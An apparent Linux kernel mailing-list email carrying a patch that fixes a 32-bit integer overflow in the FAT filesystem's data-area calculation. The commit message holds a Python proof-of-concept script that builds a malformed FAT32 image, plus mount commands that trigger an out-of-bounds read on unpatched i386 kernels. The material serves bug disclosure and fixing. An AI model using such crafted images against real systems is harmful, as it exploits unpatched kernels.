Received: from mail-qk1-f175.google.com (mail-qk1-f175.google.com [209.85.222.175])
	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 358ED2853F3
	for <linux-kernel@vger.kernel.org>; Wed,  2 Sep 2026 17:01:34 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=209.85.222.175
ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1788368497; cv=none; b=QvfgZEuGVDuSLJ3o0rZFM8NrZKIgOG4EphT4N92UtDPotKezeIqJztR+x5RiUNw2g+ra3uwtKdg2OtwwB6pKc5ZevvyOKW+g4spTbjg9X0xfBVeJyrmh6b7Y1vKh4dazuabvCLN/TWDbvyQxl29A7bsH2f8BGjuRI2JsX6iZj0Q=
ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1788368497; c=relaxed/simple;
	bh=34gvXM08FPAbDv2Z60+UcSl04kH0kroaFsXk0oDuGpo=;
	h=From:To:Cc:Subject:Date:Message-ID:MIME-Version; b=NLICaEWh9Dd2J9AksEymfhYCBJ51txQHhtUPjWq4q5gMIaUGXAuEkNytGGnqVZ9Zva+hHTwYU6auTSBZ4z2TTXP6BQC4cr8IBroEAJw1hiadXczz9w6tC8Ae1HYGRySHrAUHcX19vhrDoVu7fgzOAyA+M2Tm6pPfJQAoUkkzzm8=
ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=cs.unc.edu; spf=pass smtp.mailfrom=cs.unc.edu; dkim=pass (2048-bit key) header.d=cs.unc.edu header.i=@cs.unc.edu header.b=P2OODgE6; arc=none smtp.client-ip=209.85.222.175
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=cs.unc.edu
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=cs.unc.edu
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key) header.d=cs.unc.edu header.i=@cs.unc.edu header.b="P2OODgE6"
Received: by mail-qk1-f175.google.com with SMTP id af79cd13be357-93906e8a5feso148947585a.1
        for <linux-kernel@vger.kernel.org>; Wed, 02 Sep 2026 10:01:34 -0700 (PDT)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=cs.unc.edu; s=google; t=1788368494; x=1788973294; darn=vger.kernel.org;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:from:to:cc:subject:date:message-id:reply-to:content-type;
        bh=nuxQFI99gKPbUJQ8UPumX8ZbU0ObCvm+c/NsIMHE/cw=;
        b=P2OODgE6hEICYeR6YR449houVTSCbxr4b92VBklWSRHiSlOTAh4Y5L1TsvYA8iuacx
         l6bL7AZRGWqWqWQzeTbyCbCR8nMRuQBtAtQWdbvO9ffqMXFwSbHusDUYOKSvxqViw+rS
         GRpocjmnMy56xqzHOzdk+BmCi8j+bp5AqRWELUU182hqTuRjCzqGxKZhraiIHuzVLtYx
         fNaL/odBJ5WX32Ltek4KuAdpk+qg6k8mixuOKKRp5YcvHKdHsRHAga6F8qnnaisGoNVf
         MupZcgUOJgC2LETUg5G74qCmVKfNlzIkQthJqBeCrhaEi0DrsGDoLpE357ee8jo/NQNk
         qrLg==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20251104; t=1788368494; x=1788973294;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:x-gm-gg:x-gm-message-state:from:to:cc:subject:date
         :message-id:reply-to:content-type;
        bh=nuxQFI99gKPbUJQ8UPumX8ZbU0ObCvm+c/NsIMHE/cw=;
        b=sIJGucJJkKCiuOKAhM3MpcMf5GkmpZZxATu7BTEoBf5KbdYEOFaC13HSQdhcNSKmE6
         5P/7LDDvArvbgJDozq5Vjw+XUNK+J70f5+GEkryKWOLNZPOym9BecHJ2S+Xyo70HENAU
         Q0QY4Tlp7iRx4BYg9rC6rEIPFO7Cr4/XGjlyvBFmoHLvd8oanVhuKRbA4O5ILbNCGAXS
         090SdW75Iy0p9TFOIW1Us5Gsav7T4ObJUpX43ZkFmNovxc9XUJ6rbZ7RzNRk5OmjQZ9y
         /chScYPnl+hfURz4A6sMGGrZ1Gs1G7UbgoITtO3NVX60wSSNpDMFn379SzqY+Wz32DxN
         8MTw==
X-Gm-Message-State: AFuF++l+OY+5vh8s91Ytw8DMY5GXOUsQxO1iU7/XIvs6pwk2GpSW/TmW
	3WfGVlA77A8F3t05Ukf6lPCeIy0tRtJv3jogCFqtryu3Ur/fUKFSOjyAdKsaOQasSLWW1v5rWoy
	5dt+MUA==
X-Gm-Gg: AR+sD10o7Ny1Wxcq/7pnJHlcD8rcjMrP1mVaqbFmBGcUwJnu9k5Ed73gUGlOo5wqftT
	phhXwpmr1sDgee8w2XEYo9NpS5hwawcZdUUBI4Z13JuMTSPYXKUys1eQXtY6JKwYXpQE29fALw1
	/sjTwPxX4XPfi9dr87SaixWAMjChsLuC1qGK2lQG5Baa8BeUVlsB20kXR3Ddvz9Eu6UHf79OHSf
	QZEsYZqUod+NcsyW0u3WgyeBVaPB1fxGj8UyX4jNWKf1xvltsg6jACQSsIjxIwR4OWrP2+eqN9D
	dxqU817CJCFM+11IJDk4dOyV/fSbwvBt5ycmqIG3w9b3BjX4G95GJh3q1vhEo2bQMiL9/kr9FQW
	PeTdOQmm3gi3ezHs9F5Q4M9gvfEjaDa2J3YQI0pyCS0jwN70s7Z9z/mOjRPpHrOLXxfsFMD/l9N
	7kLERzsrGdEpCD54EFGJJhqsgs7l8veMPoqPmIFpFBTXpGTdR9Uuejo9WMtzzHgsVAR1EtN4AgZ
	YCxyt6K1M8=
X-Received: by 2002:a05:620a:406:b0:938:61d7:badc with SMTP id af79cd13be357-93960f792abmr619711885a.36.1788368493636;
        Wed, 02 Sep 2026 10:01:33 -0700 (PDT)
Received: from cobra01.cs.unc.edu (cobra01.cs.unc.edu. [152.2.130.143])
        by smtp.gmail.com with ESMTPSA id af79cd13be357-9395f360cadsm250061985a.29.2026.09.02.10.01.32
        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
        Wed, 02 Sep 2026 10:01:33 -0700 (PDT)
From: hengyul@cs.unc.edu
To: hirofumi@mail.parknet.co.jp
Cc: linux-kernel@vger.kernel.org
Subject: [PATCH v3] fat: calculate data area start without overflow
Date: Wed,  2 Sep 2026 13:01:15 -0400
Message-ID: <20260902170115.4162222-1-hengyul@cs.unc.edu>
X-Mailer: git-send-email 2.53.0
Precedence: bulk
X-Mailing-List: linux-kernel@vger.kernel.org
List-Id: <linux-kernel.vger.kernel.org>
List-Subscribe: <mailto:linux-kernel+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:linux-kernel+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
Content-Transfer-Encoding: 8bit

From: Hengyu Liang <hengyul@cs.unc.edu>

On 32-bit architectures, sbi->fat_length, sbi->dir_start and
sbi->data_start are unsigned long. The number of FATs is an 8-bit BPB
field, while the FAT32 length is a 32-bit BPB field. Therefore, the
calculation

    sbi->fat_start + sbi->fats * sbi->fat_length

can wrap before data_start is checked against total_sectors.

For example, with fat_start=32, fats=2 and fat_length=0x80000001,
the unwrapped data area start is 0x100000022 (4294967330), but the
calculation wraps to 34 on i386. With total_sectors=36, the
validation then incorrectly passes.

The following script creates an image that demonstrates the problem:

    python3 - <<'PY'
    import struct

    S = 512
    b = bytearray(36 * S)

    def p(off, fmt, value):
        struct.pack_into(fmt, b, off, value)

    # FAT32 BPB
    b[0:3] = b'\xeb\x58\x90'
    b[3:11] = b'MSWIN4.1'
    p(11, '<H', 512)
    b[13] = 1
    p(14, '<H', 32)             # reserved sectors
    b[16] = 2                   # number of FATs
    p(17, '<H', 0)
    p(19, '<H', 0)
    b[21] = 0xf8
    p(22, '<H', 0)
    p(24, '<H', 1)
    p(26, '<H', 1)
    p(32, '<I', 36)             # total sectors
    p(36, '<I', 0x80000001)     # FAT32 length
    p(44, '<I', 2)              # root cluster
    p(48, '<H', 1)              # FSINFO sector
    b[64] = 0x80
    b[66] = 0x29
    p(67, '<I', 0x12345678)
    b[71:82] = b'OVERFLOW   '
    b[82:90] = b'FAT32   '
    b[510:512] = b'\x55\xaa'

    # FSINFO
    p(S, '<I', 0x41615252)
    p(S + 484, '<I', 0x61417272)
    p(S + 488, '<I', 0xffffffff)
    p(S + 492, '<I', 0xffffffff)

    # Wrapped FAT starts at sector 32
    fat = 32 * S
    p(fat + 8, '<I', 0x0fffffff)   # FAT[2]
    p(fat + 12, '<I', 0x0fffffff)  # FAT[3]

    # Wrapped data_start == 34
    root = 34 * S
    b[root:root + 11] = b'ESCAPE  TXT'
    b[root + 11] = 0x20
    p(root + 26, '<H', 3)
    p(root + 28, '<I', 4)
    b[35 * S:35 * S + 4] = b'OOB!'

    open('fat-overflow.img', 'wb').write(b)
    PY

Attach fat-overflow.img as /dev/sdb and run:

    mount -t vfat -o ro /dev/sdb /mnt
    cat /mnt/ESCAPE.TXT

On an unpatched i386 kernel, the mount succeeds and reading the file
returns:

    OOB!

On an x86-64 kernel and on a patched i386 kernel, mounting is rejected
with:

    mount: mounting /dev/sdb on /mnt failed: Invalid argument

Calculate dir_start and data_start in u32 using
check_mul_overflow() and check_add_overflow(). Since total_sectors is
also a u32 value, any result that overflows u32 cannot describe a valid
volume. Reject such layouts before storing the values in the existing
unsigned long fields. The existing total_sectors check handles values
that fit in u32 but still lie beyond the volume.

Signed-off-by: Hengyu Liang <hengyul@cs.unc.edu>
---
Changes in v3:
- Keep the multiplication check on one line for readability.
- Report overflow before rejecting the volume.

 fs/fat/inode.c | 23 +++++++++++++++++------
 1 file changed, 17 insertions(+), 6 deletions(-)

diff --git a/fs/fat/inode.c b/fs/fat/inode.c
index f775a004cae1..0b0bbe777842 100644
--- a/fs/fat/inode.c
+++ b/fs/fat/inode.c
@@ -20,6 +20,7 @@
 #include <linux/blkdev.h>
 #include <linux/backing-dev.h>
 #include <linux/unaligned.h>
+#include <linux/overflow.h>
 #include <linux/random.h>
 #include <linux/iversion.h>
 #include <linux/fs_struct.h>
@@ -1577,6 +1578,7 @@ int fat_fill_super(struct super_block *sb, struct fs_context *fc,
 	struct msdos_sb_info *sbi;
 	u16 logical_sector_size;
 	u32 total_sectors, total_clusters, fat_clusters, rootdir_sectors;
+	u32 dir_start, data_start;
 	long error;
 	char buf[50];
 	struct timespec64 ts;
@@ -1752,7 +1754,6 @@ int fat_fill_super(struct super_block *sb, struct fs_context *fc,
 	sbi->dir_per_block = sb->s_blocksize / sizeof(struct msdos_dir_entry);
 	sbi->dir_per_block_bits = ffs(sbi->dir_per_block) - 1;
 
-	sbi->dir_start = sbi->fat_start + sbi->fats * sbi->fat_length;
 	sbi->dir_entries = bpb.fat_dir_entries;
 	if (sbi->dir_entries & (sbi->dir_per_block - 1)) {
 		if (!silent)
@@ -1763,20 +1764,30 @@ int fat_fill_super(struct super_block *sb, struct fs_context *fc,
 
 	rootdir_sectors = sbi->dir_entries
 		* sizeof(struct msdos_dir_entry) / sb->s_blocksize;
-	sbi->data_start = sbi->dir_start + rootdir_sectors;
+	if (check_mul_overflow(sbi->fats, sbi->fat_length, &dir_start) ||
+	    check_add_overflow(sbi->fat_start, dir_start, &dir_start) ||
+	    check_add_overflow(dir_start, rootdir_sectors, &data_start)) {
+		if (!silent)
+			fat_msg(sb, KERN_ERR,
+				"overflow of root dir or data layout");
+		goto out_invalid;
+	}
+
 	total_sectors = bpb.fat_sectors;
 	if (total_sectors == 0)
 		total_sectors = bpb.fat_total_sect;
 
-	if (total_sectors < sbi->data_start) {
+	if (total_sectors < data_start) {
 		if (!silent)
 			fat_msg(sb, KERN_ERR,
-				"data area starts beyond volume (%lu > %u)",
-				sbi->data_start, total_sectors);
+				"data area starts beyond volume (%u > %u)",
+				data_start, total_sectors);
 		goto out_invalid;
 	}
 
-	total_clusters = (total_sectors - sbi->data_start) / sbi->sec_per_clus;
+	sbi->dir_start = dir_start;
+	sbi->data_start = data_start;
+	total_clusters = (total_sectors - data_start) / sbi->sec_per_clus;
 
 	if (!is_fat32(sbi))
 		sbi->fat_bits = (total_clusters > MAX_FAT12) ? 16 : 12;
